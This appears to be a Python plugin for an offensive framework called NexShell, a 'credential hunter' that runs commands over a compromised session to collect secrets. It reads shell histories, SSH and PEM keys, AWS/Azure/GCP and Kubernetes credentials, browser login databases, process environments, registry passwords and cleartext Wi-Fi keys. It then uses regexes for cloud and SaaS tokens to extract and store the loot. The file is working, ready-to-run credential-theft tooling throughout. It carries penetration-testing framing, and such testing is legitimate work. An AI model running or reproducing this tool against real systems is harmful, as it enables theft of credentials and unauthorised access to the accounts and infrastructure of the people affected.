#!/usr/bin/env python3
"""
NexShell Plugin — Credential Hunter v3.0 (2026 Edition)
Hunts credentials across files, environment, config, databases, and cloud providers.
Cross-platform (Linux + Windows).

New in v3.0:
  - IaC & Cloud State Files (Terraform .tfstate, AWS SSO, Azure CLI tokens)
  - Modern SaaS Tokens (GitHub PAT, Stripe, Twilio, SendGrid, Vercel, NPM)
  - Connection Strings (MongoDB, Postgres, MSSQL URIs)
  - Windows Wi-Fi Passwords, PuTTY/WinSCP, PowerShell History
  - Optimized search paths to prevent system hangs on large filesystems
  - Smart regex extraction with deduplication

Usage:
    (NexShell)> plugins run cred-hunter
    (NexShell)> plugins run cred-hunter --deep   (includes broader recursive search)
"""

import re
from core.plugin import NexPlugin


class CredHunter(NexPlugin):
    name        = "cred-hunter"
    description = "Modern credential hunter: files, env, cloud, IaC, SaaS tokens, DBs"
    author      = "vulnquest58"
    version     = "3.0"
    platform    = "all"
    category    = "recon"
    mitre_id    = "T1552"

    # ── Linux credential hunts (Optimized paths to prevent hangs) ─────────────
    LINUX_HUNTS = [
        # Shell history
        ("cat ~/.bash_history ~/.zsh_history ~/.local/share/fish/fish_history 2>/dev/null | tail -200", "Shell History"),
        ("cat /root/.bash_history /root/.zsh_history 2>/dev/null | tail -200", "Root Shell History"),

        # SSH & Keys
        ("find /home /root /opt -maxdepth 5 -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' -o -name '*.pem' 2>/dev/null | head -20", "SSH & PEM Keys (Paths)"),
        ("cat ~/.ssh/known_hosts ~/.ssh/authorized_keys ~/.ssh/config 2>/dev/null", "SSH Config & Known Hosts"),

        # Web App & Framework Configs
        ("find /var/www /opt /srv /home -maxdepth 4 -name '.env*' -o -name 'wp-config.php' -o -name 'settings.py' -o -name 'database.yml' -o -name 'application.yml' 2>/dev/null | head -20", "Web App Config Paths"),
        ("grep -riE 'password|secret|api_key|token' /var/www /opt /srv /home --include='*.env*' --include='*.php' --include='*.py' --include='*.yml' --include='*.json' 2>/dev/null | head -30", "Grep Web App Secrets"),

        # Databases
        ("cat ~/.my.cnf ~/.pgpass /etc/mysql/debian.cnf 2>/dev/null", "Local DB Creds"),
        ("find /home /root /opt -maxdepth 5 -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null | head -10", "SQLite Databases"),

        # Cloud, IaC & K8s (Terraform, AWS, GCP, Azure)
        ("find /home /root /opt -maxdepth 5 -name 'terraform.tfstate*' -o -name 'credentials.json' -o -name 'application_default_credentials.json' 2>/dev/null", "Cloud/IaC State Files"),
        ("cat ~/.aws/credentials ~/.aws/config ~/.gcloud/credentials.db ~/.azure/accessTokens.json 2>/dev/null", "Cloud CLI Configs"),
        ("ls -la ~/.aws/sso/cache/ ~/.kube/ 2>/dev/null", "AWS SSO & K8s Dirs"),
        ("cat /run/secrets/* /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null", "Container Secrets"),

        # Package Managers & Dev Tools
        ("cat ~/.npmrc ~/.pypirc ~/.gitconfig ~/.vault-token 2>/dev/null", "Dev Tools Configs"),
        ("grep -riE 'token|password|secret' ~/.npmrc ~/.pypirc ~/.gitconfig 2>/dev/null", "Dev Tools Secrets"),

        # Browser Data
        ("find /home /root -maxdepth 6 -name 'logins.json' -o -name 'key4.db' -o -name 'Login Data' 2>/dev/null", "Browser Credential Files"),

        # Process Memory
        ("cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'pass|secret|key|token|aws|azure' | head -20", "Process Env Vars"),
    ]

    # ── Windows credential hunts ───────────────────────────────────────────────
    WINDOWS_HUNTS = [
        # Windows Native & DPAPI
        ("cmdkey /list", "Saved Windows Credentials (cmdkey)"),
        ("powershell -c \"Get-StoredCredential | Format-List\"", "Stored Credentials (PS)"),
        ("reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i password", "HKLM Registry Passwords"),
        ("reg query HKCU /f password /t REG_SZ /s 2>nul | findstr /i password", "HKCU Registry Passwords"),
        ("dir /s /b C:\\Windows\\Panther\\*unattend* C:\\Windows\\sysprep\\*unattend* 2>nul", "Unattend Files"),
        
        # Shell History
        ("type C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul", "PowerShell History"),
        ("type C:\\Users\\*\\.bash_history C:\\Users\\*\\.zsh_history 2>nul", "WSL / Bash History"),

        # Wi-Fi & RDP / SSH Clients
        ("netsh wlan show profiles 2>nul", "Wi-Fi Profiles"),
        ("netsh wlan show profile name=* key=clear 2>nul | findstr /i 'Key Content'", "Wi-Fi Passwords"),
        ("reg query 'HKCU\\Software\\SimonTatham\\PuTTY\\Sessions' /s 2>nul", "PuTTY Sessions"),
        ("reg query 'HKCU\\Software\\Martin Prikryl\\WinSCP 2\\Sessions' /s 2>nul", "WinSCP Sessions"),
        
        # Cloud & IaC (Terraform, AWS, Azure)
        ("dir /s /b C:\\Users\\*\\terraform.tfstate* C:\\Users\\*\\.aws\\credentials C:\\Users\\*\\.azure\\accessTokens.json 2>nul", "Cloud/IaC State Files"),
        ("type C:\\Users\\*\\.aws\\sso\\cache\\*.json 2>nul", "AWS SSO Cache"),
        
        # Dev Tools & Package Managers
        ("dir /s /b C:\\Users\\*\\.npmrc C:\\Users\\*\\.pypirc C:\\Users\\*\\.gitconfig 2>nul", "Dev Tools Configs"),
        ("type C:\\Users\\*\\.npmrc C:\\Users\\*\\.pypirc 2>nul", "Dev Tools Secrets"),
        
        # Web & IIS
        ("dir /s /b C:\\inetpub\\wwwroot\\*web.config 2>nul", "IIS web.config Paths"),
        ("powershell -c \"Get-Content C:\\inetpub\\wwwroot\\*web.config -ErrorAction SilentlyContinue | Select-String 'password|connectionString'\"", "IIS Connection Strings"),

        # Browser & Password Managers
        ("dir /s /b C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\*\\Login Data C:\\Users\\*\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\logins.json 2>nul", "Browser Credential Files"),
        ("dir /s /b C:\\Users\\*\\*.kdbx C:\\Users\\*\\*.1pif C:\\Users\\*\\*.opvault 2>nul", "Password Manager Vaults"),
        
        # Environment & Misc
        ("set | findstr /i \"pass key secret token aws azure\"", "Env Secrets"),
        ("findstr /si /m 'password secret token' C:\\Users\\*\\*.txt C:\\Users\\*\\*.xml C:\\Users\\*\\*.config 2>nul", "Grep User Files for Secrets"),
    ]

    # ── Regex patterns for secret extraction (2025/2026 Standards) ────────────
    SECRET_PATTERNS = [
        # Generic
        (r"(?i)(?:password|passwd|pass|pwd)\s*[=:]\s*['\"]?([^\s'\"#;]{4,})", "password"),
        (r"(?i)(?:secret|secret_key|api_secret)\s*[=:]\s*['\"]?([^\s'\"#;]{6,})", "secret"),
        (r"(?i)(?:api_key|apikey)\s*[=:]\s*['\"]?([A-Za-z0-9\-_]{10,})", "api_key"),
        (r"(?i)(?:token|auth_token|access_token)\s*[=:]\s*['\"]?([A-Za-z0-9\-_\.]{10,})", "token"),
        
        # Cloud Providers
        (r"AKIA[0-9A-Z]{16}", "aws_access_key"),
        (r"(?i)(?:aws_secret_access_key)\s*[=:]\s*([A-Za-z0-9/+=]{40})", "aws_secret"),
        (r"(?i)(?:AZURE_CLIENT_SECRET|AZURE_TENANT_ID)\s*[=:]\s*['\"]?([^\s'\"]{10,})", "azure_secret"),
        (r"ya29\.[0-9A-Za-z\-_]+", "google_oauth_token"),
        
        # SaaS & Dev Tools
        (r"ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{82}", "github_token"),
        (r"glpat-[A-Za-z0-9\-_]{20,}", "gitlab_token"),
        (r"xox[baprs]-[A-Za-z0-9\-]+", "slack_token"),
        (r"sk_live_[0-9a-zA-Z]{24,}|rk_live_[0-9a-zA-Z]{24,}", "stripe_key"),
        (r"SK[0-9a-fA-F]{32}", "twilio_api_key"),
        (r"SG\.[A-Za-z0-9\-_]{22}\.[A-Za-z0-9\-_]{43}", "sendgrid_key"),
        (r"npm_[A-Za-z0-9]{36}", "npm_token"),
        (r"AIza[0-9A-Za-z\-_]{35}", "google_api_key"),
        (r"vercel_[A-Za-z0-9]{24}", "vercel_token"),
        
        # Connection Strings & URIs
        (r"(?i)(?:db_pass|database_password|db_password)\s*[=:]\s*['\"]?([^\s'\"#;]{4,})", "db_password"),
        (r"mongodb(\+srv)?:\/\/[^:\s]+:[^@\s]+@[^\s]+", "mongodb_uri"),
        (r"postgres(ql)?:\/\/[^:\s]+:[^@\s]+@[^\s]+", "postgres_uri"),
        (r"mysql:\/\/[^:\s]+:[^@\s]+@[^\s]+", "mysql_uri"),
        (r"(?i)Server=[^;]+;Database=[^;]+;User Id=[^;]+;Password=[^;]+;", "mssql_conn_string"),
        
        # Cryptographic Material
        (r"-----BEGIN (?:RSA|EC|OPENSSH|DSA|PGP) PRIVATE KEY(?: BLOCK)?-----", "private_key"),
        (r"eyJ[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]{10,}", "jwt_token"),
        
        # Bearer Tokens in logs/headers
        (r"(?i)Authorization:\s*Bearer\s+([A-Za-z0-9\-_\.]+)", "bearer_token"),
    ]

    def run(self, session, args: list):
        deep     = '--deep' in (args or [])
        platform = self._detect_platform(session)

        self.info(f"Starting cred-hunter v3.0 (platform: {platform}, deep: {deep})...")
        all_secrets = []
        sections    = []

        hunts = self.LINUX_HUNTS if platform == 'linux' else self.WINDOWS_HUNTS

        for cmd, label in hunts:
            try:
                out = self._exec(session, cmd)
                if not out.strip():
                    continue

                # Extract secrets
                secrets = self._extract_secrets(out)
                if secrets:
                    all_secrets.extend(secrets)

                    # Save to cred store
                    for s_type, s_val in secrets:
                        self.loot(
                            f"[{s_type}] {s_val[:120]}",
                            category='credentials',
                            source=f"cred-hunter:{label}"
                        )

                sections.append(f"\n{'━'*64}")
                sections.append(f"  [{label}]  ({len(secrets)} secrets found)")
                sections.append('━'*64)
                sections.append(out.strip()[:600])

            except Exception as e:
                self.warn(f"Hunt failed [{label}]: {e}")

        # ── Create aggregate finding ──────────────────────────────────────────
        if all_secrets:
            uniq_types = list({s[0] for s in all_secrets})
            self.finding(
                title          = f"Credentials Discovered ({len(all_secrets)} secrets)",
                description    = (
                    f"cred-hunter found {len(all_secrets)} secrets of types: {', '.join(uniq_types)}\n\n"
                    + "\n".join(f"  [{t}] {v[:60]}" for t, v in all_secrets[:10])
                ),
                severity       = "Critical" if any(t in ('private_key','aws_access_key','aws_secret', 'stripe_key', 'github_token') for t,_ in all_secrets) else "High",
                recommendation = "Rotate all discovered credentials immediately. Review access logs for unauthorized use.",
                mitre_id       = self.mitre_id,
            )
            self.emit('finding.created', severity='critical', title='Credentials Discovered', plugin=self.name)

        self.info(f"cred-hunter complete — {len(all_secrets)} secrets found.")
        return '\n'.join(sections) if sections else "No credentials found."

    # ── Internal helpers ──────────────────────────────────────────────────────

    def _extract_secrets(self, text: str) -> list:
        """Extract (type, value) tuples from text using regex patterns."""
        results = []
        seen = set()
        for pattern, secret_type in self.SECRET_PATTERNS:
            for match in re.finditer(pattern, text):
                # Prefer the last captured group (usually the secret itself)
                val = match.group(0)
                if match.lastindex:
                    val = match.group(match.lastindex)
                
                # Clean up quotes if they slipped in
                val = val.strip("'\"")
                
                if len(val) >= 4 and val not in seen:
                    seen.add(val)
                    results.append((secret_type, val))
        return results

    def _detect_platform(self, session) -> str:
        """Detect the remote platform from session metadata or probing."""
        # Check session OS attribute — Session uses uppercase .OS
        for attr in ('OS', 'os', '_os', 'platform'):
            val = getattr(session, attr, None)
            if val and isinstance(val, str):
                val_l = val.lower()
                if 'windows' in val_l:
                    return 'windows'
                if 'linux' in val_l or 'unix' in val_l:
                    return 'linux'
        # Probe via command
        try:
            out = self._exec(session, 'echo %OS%', timeout=5) or ''
            if 'Windows' in out:
                return 'windows'
        except Exception:
            pass
        return 'linux'